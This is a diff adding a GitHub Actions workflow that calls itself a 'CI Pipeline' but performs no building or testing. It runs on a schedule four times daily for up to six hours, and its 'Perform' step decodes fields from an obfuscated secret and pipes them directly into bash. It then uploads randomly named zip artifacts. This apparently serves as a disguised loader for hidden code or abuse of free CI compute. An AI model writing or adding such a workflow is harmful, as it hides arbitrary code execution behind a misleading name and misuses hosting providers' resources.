@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          zxct1896: ${{ secrets.zxct1896 }}
+        run: |
+          printf '%s' "$zxct1896" | jq -r .ibtkl8769 | /bin/bash
+          printf '%s' "$t1131" | jq -r .h03747 | /bin/bash
+          printf '%s' "$zvvo8" | jq -r .hxww9920 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: zT7zs41L
+          path: "*.zip"
+          retention-days: 1
